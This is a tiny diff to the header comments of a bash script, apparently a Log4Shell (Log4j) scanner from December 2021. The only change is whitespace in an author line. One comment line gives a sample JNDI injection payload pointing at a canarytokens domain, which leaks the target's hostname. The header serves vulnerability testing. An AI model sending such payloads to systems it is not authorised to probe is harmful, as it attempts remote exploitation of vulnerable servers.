@@ -1,5 +1,5 @@
 #!/bin/bash 
-# Author: Abhijeet Singh (@abhiunix)
+#Author: Abhijeet Singh (@abhiunix)
 # Date: 12 Dec 2021
 # Twitter: https://twitter.com/abhiunix
 # Sample Payload: ${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}
